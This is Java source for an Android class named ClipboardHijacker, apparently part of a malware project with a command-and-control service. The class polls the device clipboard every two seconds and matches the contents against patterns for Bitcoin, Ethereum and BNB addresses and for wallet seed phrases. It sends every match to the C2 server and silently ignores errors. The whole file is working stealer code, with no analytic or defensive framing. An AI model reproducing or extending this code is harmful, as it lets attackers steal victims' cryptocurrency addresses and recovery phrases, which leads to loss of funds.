package com.wuzenx.utils;

import android.content.ClipboardManager;
import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import com.wuzenx.C2Service;

public class ClipboardHijacker {
    private Context context;
    private C2Service c2;
    private boolean enabled = false;
    private Handler handler = new Handler(Looper.getMainLooper());
    private String lastClip = "";
    
    // Crypto address regex patterns
    private static final String BTC_PATTERN = "([13][a-km-zA-HJ-NP-Z1-9]{25,34})";
    private static final String ETH_PATTERN = "(0x[a-fA-F0-9]{40})";
    private static final String BNB_PATTERN = "(bnb[a-zA-Z0-9]{39})";
    private static final String SEED_PATTERN = "\\b([a-z]+\\s+){11,23}[a-z]+\\b";
    
    private java.util.regex.Pattern pattern = java.util.regex.Pattern.compile(
        ETH_PATTERN + "|" + BTC_PATTERN + "|" + BNB_PATTERN + "|" + SEED_PATTERN,
        java.util.regex.Pattern.CASE_INSENSITIVE
    );

    public ClipboardHijacker(Context context, C2Service c2) {
        this.context = context;
        this.c2 = c2;
    }

    public void start() {
        if (!enabled) {
            enabled = true;
            poll();
        }
    }

    public void stop() {
        enabled = false;
        handler.removeCallbacksAndMessages(null);
    }

    private void poll() {
        if (!enabled) return;
        try {
            ClipboardManager cm = (ClipboardManager) 
                context.getSystemService(Context.CLIPBOARD_SERVICE);
            
            if (cm.hasPrimaryClip() && cm.getPrimaryClip() != null && 
                cm.getPrimaryClip().getItemCount() > 0) {
                
                CharSequence text = cm.getPrimaryClip().getItemAt(0).getText();
                if (text != null) {
                    String clip = text.toString();
                    if (!clip.equals(lastClip)) {
                        lastClip = clip;
                        
                        // Check for crypto addresses or seeds
                        java.util.regex.Matcher matcher = pattern.matcher(clip);
                        if (matcher.find()) {
                            c2.sendMessage("clipboard", clip);
                        }
                    }
                }
            }
        } catch (Exception ignored) {}
        
        handler.postDelayed(this::poll, 2000);
    }
}
